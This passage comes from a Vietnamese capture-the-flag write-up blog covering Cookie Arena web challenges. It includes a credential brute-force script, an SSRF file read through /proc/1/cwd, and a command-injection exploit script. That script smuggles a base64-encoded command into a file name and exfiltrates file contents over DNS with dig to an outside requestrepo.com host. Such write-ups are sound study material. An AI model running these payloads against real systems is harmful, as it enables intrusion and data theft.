    <span class="n">passwds</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">().</span><span class="n">strip</span><span class="p">().</span><span class="n">splitlines</span><span class="p">()</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">users</span><span class="p">)):</span>
    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">passwds</span><span class="p">)):</span>
        <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">ips</span><span class="p">)):</span>
            <span class="n">login</span> <span class="o">=</span> <span class="p">{</span>
                <span class="s">'password'</span><span class="p">:</span> <span class="n">passwds</span><span class="p">[</span><span class="n">j</span><span class="p">],</span>
                <span class="s">'username'</span><span class="p">:</span> <span class="n">users</span><span class="p">[</span><span class="n">i</span><span class="p">],</span>
                <span class="s">'ip'</span><span class="p">:</span> <span class="n">ips</span><span class="p">[</span><span class="n">k</span><span class="p">]</span>
            <span class="p">}</span>
            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">login</span><span class="p">)</span>
            <span class="k">print</span><span class="p">(</span><span class="n">login</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
            <span class="k">if</span> <span class="s">'FLAG{Not_True}'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
                <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div></div>

<p>V√† vi·ªác c√≤n l·∫°i l√† s·∫•y th√¥i, h√¨nh ·∫£nh g·∫•u ƒëang d√πng kh·∫©u s√∫ng sida c·ªßa m√¨nh:</p>

<p><img src="https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/gatling_gun_3.png" alt="" /></p>

<p>Sau m·ªôt h·ªìi bruteforce th√¨ m√¨nh ƒë√£ th·∫•y ƒë∆∞·ª£c flag:</p>

<p><img src="https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/gatling_gun_4.png" alt="" /></p>

<p>Flag: <code class="language-plaintext highlighter-rouge">FLAG{e6c068faf9241fe9d1f2000516718377}</code></p>

<h2 id="paparazzi">Paparazzi</h2>
<blockquote>
  <p>ƒê√¢y l√† c√°nh c·ª≠a th·∫ßn k√¨ gi√∫p G√† v∆∞·ª£t qua m·ªçi r√†o c·∫£n, bi√™n gi·ªõi. M√®o Yang H·ªì khao kh√°t c√≥ ƒë∆∞·ª£c th·ª© b·∫£o b·ªëi n√†y, n√™n ng√†y ƒë√™m ng·ªìi t√¨m ki·∫øm l·ªó h·ªïng. B·∫°n mu·ªën gi√∫p M√®o m·ªôt tay?</p>

  <p>http://chal8.web.letspentest.org/</p>
</blockquote>

<p>Sau khi d·∫°o m·ªôt v√≤ng, m√¨nh nh·∫≠n th·∫•y ·ªü ƒë√¢y ch·ªâ c√≥ nh·∫≠p v√†o URL n√™n m√¨nh ƒëo√°n ƒë√¢y r·∫•t c√≥ th·ªÉ l√† m·ªôt b√†i SSRF.</p>

<p><img src="https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/paparazzi_1.png" alt="" /></p>

<p>Sau khi nh·∫≠p th·ª≠ <code class="language-plaintext highlighter-rouge">file:///</code> v√†o m√¨nh nh·∫≠n ƒë∆∞·ª£c json c√≥ ch·ª©a t√™n m·ªôt file png:</p>

<p><img src="https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/paparazzi_2.png" alt="" /></p>

<p>M√¨nh ti·∫øp t·ª•c t√¨m trong source th√¨ th·∫•y m·ªôt ƒëo·∫°n js c√≥ v·∫ª kh·∫£ nghi:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">async</span> <span class="kd">function</span> <span class="nx">getHistory</span><span class="p">()</span>
<span class="p">{</span>	
	<span class="nx">src</span> <span class="o">=</span> <span class="p">[]</span>
	<span class="kd">const</span> <span class="nx">response</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">fetch</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">origin</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">/get_all_screenshot</span><span class="dl">"</span><span class="p">);</span>
	<span class="kd">var</span> <span class="nx">data</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">response</span><span class="p">.</span><span class="nx">json</span><span class="p">();</span>
	<span class="kd">let</span> <span class="nx">tab</span> <span class="o">=</span> <span class="s2">`&lt;h1&gt;History&lt;/h1&gt;`</span><span class="p">;</span>
	<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">status</span><span class="p">)</span>
	<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">r</span> <span class="k">of</span> <span class="nx">data</span><span class="p">.</span><span class="nx">status</span><span class="p">)</span> <span class="p">{</span>
		<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">`&lt;img src="</span><span class="p">${</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">origin</span><span class="p">}</span><span class="s2">/get_screenshot?file=</span><span class="p">${</span><span class="nx">r</span><span class="p">}</span><span class="s2">"&gt;`</span><span class="p">);</span>
		<span class="nx">tab</span> <span class="o">+=</span> <span class="s2">`&lt;img src="</span><span class="p">${</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">origin</span><span class="p">}</span><span class="s2">/get_screenshot?file=</span><span class="p">${</span><span class="nx">r</span><span class="p">}</span><span class="s2">"&gt;`</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">history</span><span class="dl">"</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">tab</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>·ªû ƒë√¢y <code class="language-plaintext highlighter-rouge">get_screenshot?file=</code> c√≥ v·∫ª l√† ch·ªó ƒë·ªÉ xem file .png ·ªü tr√™n. Boom, v√† m√¨nh ƒë√£ c√≥ screenshot c·ªßa <code class="language-plaintext highlighter-rouge">/</code></p>

<pre><code class="language-http://chal8.web.letspentest.org/get_screenshot">
![](https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/paparazzi_3.png)

Sau khi th·ª≠ t√¨m l·∫ßn l∆∞·ª£t trong c√°c th∆∞ m·ª•c ƒë·ªÅu kh√¥ng th·∫•y flag, ri√™ng `/src` l·∫°i b·ªã `url invalid`, m√¨nh c≈©ng th·ª≠ v·ªõi c√°c URL kh√°c c√≥ ch·ª©a t·ª´ `src` th√¨ nh·∫≠n ra l√† t·ª´ kho√° n√†y ƒë√£ b·ªã block.

![](https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/paparazzi_4.png)

ƒê·ªÉ bypass c√°i n√†y v√† truy c·∫≠p v√†o `src` n√†y m√¨nh d√πng th∆∞ m·ª•c `/proc/[pid]/cwd`:

![](https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/paparazzi_5.png)

![](https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/paparazzi_6.png)

M√¨nh th·ª≠ v·ªõi `pid = 1` th√¨ th·∫•y m·ªôt th∆∞ m·ª•c c√≥ kh·∫£ nƒÉng cao l√† ch·ª©a flag:

![](https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/paparazzi_7.png)

Ti·∫øp t·ª•c ƒëi v√†o trong th√¨ m√¨nh t√¨m ƒë∆∞·ª£c file `flag.txt`:

![](https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/paparazzi_8.png)

Screenshot v√† c√≥ flag =)):

![](https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/paparazzi_9.png)

Flag: `FLAG{abc725173fa1828ea019503669b4eecd}`

## A tiny hole 
&gt; L·ª£i d·ª•ng th·ªùi ƒëi·ªÉm h·ªá th·ªëng gi√°m s√°t ng·ªß say v√† m·ªát m·ªèi sau cu·ªôc t·∫•n c√¥ng HTTP Flood. M√®o Yang H·ªì ƒë·ªôt nh·∫≠p v√†o m√°y ch·ªß Challenge c·ªßa Cookie Arena ƒë·ªÉ c√†i ƒë·∫∑t m·ªôt Web Shell ƒë·ªÉ ƒë√°nh c·∫Øp Flag. Tuy nhi√™n m√°y ch·ªß b·ªã h·∫°n ch·∫ø m·ªôt s·ªë k·∫øt n·ªëi ra ngo√†i Internet, n√™n n√≥ kh√¥ng th·ªÉ download, l∆∞u v√† th·ª±c thi m√£ ƒë·ªôc h·∫°i ƒë∆∞·ª£c. C√≤n c·ª≠a n√†o s√°ng kh√¥ng?
&gt;
&gt; http://chal17.web.letspentest.org/

ƒê·ªÅ cho ta file app.py ch·∫°y ·ªü ph√≠a server, ƒë·ªçc s∆° qua source code th√¨ m√¨nh c√≥ th·ªÉ d·ªÖ d√†ng ƒëo√°n ƒë∆∞·ª£c server s·∫Ω th·ª±c hi·ªán vi·ªác download script t·ª´ url m√¨nh nh·∫≠p v√†o v√† th·ª±c thi n√≥. Sau khi test th·ª≠ m·ªôt v√†i ƒë∆∞·ªùng link th√¨ m√¨nh nh·∫≠n ra kh√¥ng th·ªÉ k·∫øt n·ªëi ra b√™n ngo√†i. 

Mu·ªën ch·∫°y ƒë∆∞·ª£c script th√¨ m√¨nh ph·∫£i bypass qua ƒë∆∞·ª£c ƒëo·∫°n check ·ªü h√†m `download_script` tr∆∞·ªõc:

```python
def download_script(script_path, command_log, url):
	try:
		script_link = url
	except:
		return "missing url"
	r = requests.Session()
	r.mount('file://', FileAdapter())
	try:
		result = r.get(script_link)
	except:
		return "Oh no! Lost internet"
	with open(script_path, 'wb') as f:
		f.write(result.content)
		run_script(script_path, command_log)
</code></pre>

<p>ƒê·ªÉ √Ω th·∫•y d√≤ng <code class="language-plaintext highlighter-rouge">r.mount('file://', FileAdapter())</code>, m√¨nh th·ª≠ nh·∫≠p url l√† <code class="language-plaintext highlighter-rouge">file:///etc/passwd</code> th√¨ bypass ƒë∆∞·ª£c h√†m n√†y.</p>

<p>Ti·∫øp ƒë·∫øn l√† h√†m <code class="language-plaintext highlighter-rouge">run_script</code>:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">run_script</span><span class="p">(</span><span class="n">script_path</span><span class="p">,</span> <span class="n">command_log</span><span class="p">):</span>
	<span class="n">lf</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">command_log</span><span class="p">,</span> <span class="s">'wb+'</span><span class="p">)</span>
	<span class="n">command</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">Popen</span><span class="p">([</span><span class="s">'bash'</span><span class="p">,</span> <span class="n">script_path</span><span class="p">],</span> <span class="n">stderr</span><span class="o">=</span><span class="n">lf</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">lf</span><span class="p">,</span> <span class="n">universal_newlines</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
	<span class="k">return</span> <span class="s">"Run successfully"</span>
</code></pre></div></div>

<p>ƒêo·∫°n code tr√™n s·∫Ω ch·∫°y l·ªánh <code class="language-plaintext highlighter-rouge">bash</code> v·ªõi file <code class="language-plaintext highlighter-rouge">script_path</code> ƒë∆∞·ª£c truy·ªÅn v√†o, sau ƒë√≥ c·∫£ output l·∫´n error ƒë·ªÅu ƒë∆∞·ª£c ghi v√†o file <code class="language-plaintext highlighter-rouge">command_log</code></p>

<p>N·ªôi dung c·ªßa file <code class="language-plaintext highlighter-rouge">script_path</code> ƒë∆∞·ª£c l·∫•y t·ª´ url m√¨nh cung c·∫•p nh∆∞ng do kh√¥ng th·ªÉ connect ra b√™n ngo√†i n√™n vi·ªác ch√®n reverse shell v√†o ƒë√¢y l√† kh√¥ng kh·∫£ thi.</p>

<p>M√¨nh control ƒë∆∞·ª£c 2 param ƒë√≥ l√† <code class="language-plaintext highlighter-rouge">script_path</code> v√† <code class="language-plaintext highlighter-rouge">command_log</code> t·ª´ ƒë√≥ m√¨nh c√≥ th·ªÉ l·ª£i d·ª•ng ch√≠nh l·ªánh <code class="language-plaintext highlighter-rouge">bash</code> ƒë·ªÉ th·ª±c thi l·ªánh tu·ª≥ √Ω.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">echo </span>kemdau <span class="o">&gt;</span> <span class="s1">'date;
</span><span class="gp">$</span><span class="w"> </span><span class="s1">bash '</span><span class="nb">date</span><span class="p">;</span><span class="s1">' 2&gt; command_log
</span><span class="gp">$</span><span class="w"> </span><span class="s1">cat command_log
</span><span class="gp">date;</span><span class="s1">: line 1: kemdau: command not found
</span><span class="gp">$</span><span class="w"> </span><span class="s1">bash command_log
</span><span class="go">Thu Nov  4 02:48:02 PM +07 2021
</span></code></pre></div></div>

<p>·ªû ƒë√¢y m√¨nh d√πng <code class="language-plaintext highlighter-rouge">2&gt;</code> ƒë·ªÉ chuy·ªÉn h∆∞·ªõng <code class="language-plaintext highlighter-rouge">stderr</code> v√†o file nh∆∞ h√†m <code class="language-plaintext highlighter-rouge">run_script</code> ·ªü tr√™n.</p>

<p>√ù t∆∞·ªüng c·ªßa m√¨nh l√† t·∫°o 1 file v·ªõi t√™n l√† c√¢u l·ªánh c·∫ßn ch·∫°y r·ªìi l·ª£i d·ª•ng ghi error c·ªßa l·ªánh <code class="language-plaintext highlighter-rouge">bash</code> v√†o file <code class="language-plaintext highlighter-rouge">command_log</code> v√† sau ƒë√≥ <code class="language-plaintext highlighter-rouge">bash command_log</code> l√† l·ªánh s·∫Ω ƒë∆∞·ª£c th·ª±c thi. ƒêau n√£o ch∆∞a, kh√∫c n√†y khoan ƒë√£ ƒë·ªçc ti·∫øp m√† ng·ªìi ng·∫´m l·∫°i r·ªìi t·ª± th·ª≠ tr√™n m√°y m√¨nh ƒë·ªÉ hi·ªÉu nha, m√¨nh bi·∫øt b·∫°n b·ªã ƒëau n·ª≠a ƒë·∫ßu r·ªìi =))))</p>

<p>V·∫≠y c√≤n l·ªánh <code class="language-plaintext highlighter-rouge">cat /flag.txt</code> th√¨ sao? T√™n file trong linux th√¨ l√†m g√¨ ƒë·∫∑t ƒë∆∞·ª£c d·∫•u <code class="language-plaintext highlighter-rouge">/</code>? C√≥ r·∫•t nhi·ªÅu c√°ch ƒë·ªÉ bypass, m√¨nh ch·ªçn encode sang <code class="language-plaintext highlighter-rouge">base64</code>.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"cat /flag.txt"</span> | <span class="nb">base64</span>
<span class="go">Y2F0IC9mbGFnLnR4dAo=
</span><span class="gp">$</span><span class="w"> </span><span class="nb">echo </span><span class="nv">Y2F0IC9mbGFnLnR4dAo</span><span class="o">=</span> | <span class="nb">base64</span> <span class="nt">-d</span> | bash
<span class="go">cat: /flag.txt: No such file or directory
</span></code></pre></div></div>

<p>Nh∆∞ng kh√¥ng c√≥ internet th√¨ l√†m sao m√† g·ª≠i flag v·ªÅ? V·ªõi nh·ªØng chall ki·ªÉu nh∆∞ n√†y m√¨nh s·∫Ω th·ª≠ d√πng DNS ƒë·ªÉ bypass.</p>

<p>M√¨nh s·ª≠ d·ª•ng l·ªánh <code class="language-plaintext highlighter-rouge">dig</code> ƒë·ªÉ query v√† <a href="requestrepo.com">requestrepo.com</a> ƒë·ªÉ h·ª©ng DNS.</p>

<p>V√† ƒë√¢y l√† payload c·ªßa m√¨nh:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>dig <span class="si">$(</span><span class="nb">echo </span><span class="nv">Y2F0IC9mbGFnLnR4dAo</span><span class="o">=</span> | <span class="nb">base64</span> <span class="nt">-d</span> | bash<span class="si">)</span>.jrl0lymn.requestrepo.com
</code></pre></div></div>

<p>C√≤n ƒë√¢y l√† script c·ªßa m√¨nh:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">random</span>
<span class="kn">import</span> <span class="nn">string</span>
<span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64encode</span>

<span class="n">URL</span> <span class="o">=</span> <span class="s">'http://chal17.web.letspentest.org/'</span>

<span class="k">def</span> <span class="nf">send_payload</span><span class="p">(</span><span class="nb">dir</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">log</span><span class="p">):</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s">'script_dir'</span><span class="p">:</span> <span class="nb">dir</span><span class="p">,</span>
        <span class="s">'script_name'</span><span class="p">:</span> <span class="n">name</span><span class="p">,</span>
        <span class="s">'script_url'</span><span class="p">:</span> <span class="n">url</span><span class="p">,</span>
        <span class="s">'command_log_file'</span><span class="p">:</span> <span class="n">log</span>
    <span class="p">}</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="s">'/runScript'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">randstr</span><span class="p">():</span>
    <span class="k">return</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="n">choices</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span><span class="p">,</span> <span class="n">k</span><span class="o">=</span><span class="mi">10</span><span class="p">))</span>

<span class="n">core_payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'cat /flag.txt'</span>
<span class="n">core_payload</span> <span class="o">=</span> <span class="n">b64encode</span><span class="p">(</span><span class="n">core_payload</span><span class="p">).</span><span class="n">decode</span><span class="p">()</span>

<span class="n">dirname</span> <span class="o">=</span> <span class="n">randstr</span><span class="p">()</span> <span class="c1"># T√™n file t√πm lum z ƒë·ªÉ ph√° server ch∆°i n√® =)))
</span>
<span class="n">send_payload</span><span class="p">(</span><span class="n">dirname</span><span class="p">,</span> <span class="sa">f</span><span class="s">'</span><span class="se">\n</span><span class="s">dig $(echo </span><span class="si">{</span><span class="n">core_payload</span><span class="si">}</span><span class="s"> | base64 -d | bash).jrl0lymn.requestrepo.com;'</span><span class="p">,</span> <span class="s">'file:///etc/hosts'</span><span class="p">,</span> <span class="s">'log'</span><span class="p">)</span>
<span class="n">send_payload</span><span class="p">(</span><span class="n">dirname</span><span class="p">,</span> <span class="s">'bruh'</span><span class="p">,</span> <span class="s">'file:///src/logs/log.txt'</span><span class="p">,</span> <span class="s">'log1'</span><span class="p">)</span>
</code></pre></div></div>

<p>H·ª©ng DNS:</p>

<p><img src="https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/a_tiny_hole_1.png" alt="" /></p>

<p>Ph·∫£i l√† think out of the traditional connections ch·ª© nh·ªÉ, h√™ =))))</p>

<p>Flag: <code class="language-plaintext highlighter-rouge">Flag{CookieWarrior_Please_Think_Out_Of_The_Box}</code></p>

<h1 id="l·ªùi-k·∫øt">L·ªùi k·∫øt</h1>

<p>Oce, m√¨nh ƒë·ªãnh ch∆°i tr·ªôi l√†m c·∫£ 40 b√†i nh∆∞ng qu·ªπ th·ªùi gian v√† s·ª± ki√™n nh·∫´n kh√¥ng cho ph√©p, v·∫≠y m√¨nh xin ph√©p ch·ªâ vi·∫øt nh·ªØng b√†i m√¨nh c·∫£m th·∫•y kh√≥ v√† th·ª≠ th√°ch, d√π sao th√¨ c·∫£m ∆°n ƒë√£ ƒë·ªçc b√†i c·ªßa m√¨nh. C·∫£m ∆°n BTC ƒë√£ t·ªï ch·ª©c cu·ªôc thi kh√° vui, nh∆∞ng m√¨nh nghƒ© n·∫øu c√≥ Cookie Arena 2 th√¨ n√™n th√™m m·∫£ng Pwn/Re v√† tƒÉng ƒë·ªô kh√≥ cho c√°c challenge, v√† b·ªõt guessing l·∫°i üëÄ</p>

<p>Gud bai see you again, G·∫•u quay v·ªÅ hang v·ªõi con S√¢u ng·ªß ƒë√¢y =))</p>

</div>





<div class="related">
  <h2>related posts</h2>
  <ul class="related-posts">
    
      <li>
        <h3>
          <a href="/2021/09/27/downunderctf-2021.html">
            DownUnderCTF2021 Writeups
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/2021/06/07/book-manager-hcmus-writeup.html">
            Book manager writeup [HCMUSCTF2021 Final]
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/2021/05/23/HCMUS-CTF-2021-writeup.html">
            HCMUS CTF 2021 writeup
          </a>
        </h3>
      </li>
    
  </ul>
</div>




  
  <h2>all tags</h2>
  <div class="tag-cloud"><a href="/tag/beginner/" class="set-1">beginner</a> <a href="/tag/cookiehanhoan/" class="set-1">cookiehanhoan</a> <a href="/tag/crypto/" class="set-1">crypto</a> <a href="/tag/forensic/" class="set-1">forensic</a> <a href="/tag/heap-exploit/" class="set-2">heap exploit</a> <a href="/tag/introduction/" class="set-1">introduction</a> <a href="/tag/network/" class="set-1">network</a> <a href="/tag/picoctf2019/" class="set-1">picoCTF2019</a> <a href="/tag/privacy/" class="set-2">privacy</a> <a href="/tag/pwn/" class="set-5">pwn</a> <a href="/tag/pwnable.tw/" class="set-2">pwnable.tw</a> <a href="/tag/tutorial/" class="set-3">tutorial</a> <a href="/tag/web/" class="set-1">web</a></div>
  



      </div>
    </main><footer class="site-footer">
  <div class="wrapper">
    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
    <label for="theme-toggle" class="toggle">
    <span class="toggle__handler">
      <span class="crater crater--1"></span>
      <span class="crater crater--2"></span>
      <span class="crater crater--3"></span>
    </span>
        <span class="star star--1"></span>
        <span class="star star--2"></span>
        <span class="star star--3"></span>
        <span class="star star--4"></span>
        <span class="star star--5"></span>
        <span class="star star--6"></span>
    </label>
</div>
<script type="text/javascript">
const theme = localStorage.getItem('theme');

if (theme === "light") {
    document.documentElement.setAttribute('data-theme', 'light');
} else {
    document.documentElement.setAttribute('data-theme', 'dark');
}
const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');

function activateDarkTheme() {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'dark');
    document.documentElement.classList.add('theme--dark');
    document.documentElement.classList.remove('theme--light');
	document.getElementById("theme-toggle").className = 'light';
	window.localStorage.setItem('theme', 'dark');
}

function activateLightTheme() {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'light');
    document.documentElement.classList.add('theme--light');
    document.documentElement.classList.remove('theme--dark');
	document.getElementById("theme-toggle").className = 'dark';
	window.localStorage.setItem('theme', 'light');
}

if (theme === "dark") {
    activateDarkTheme();
} else if (theme === "light") {
    activateLightTheme();
} else if  (userPrefers === "light") {
    activateDarkTheme();
} else {
    activateDarkTheme();
}

function modeSwitcher() {
	let currentMode = document.documentElement.getAttribute('data-theme');
	if (currentMode === "dark") {
	    activateLightTheme();
	} else {
	    activateDarkTheme();
	}
}
</script></div>
  </div>
</footer>


<script>
      window.FontAwesomeConfig = {
        searchPseudoElements: true
      }
    </script>
  </body>

</html>
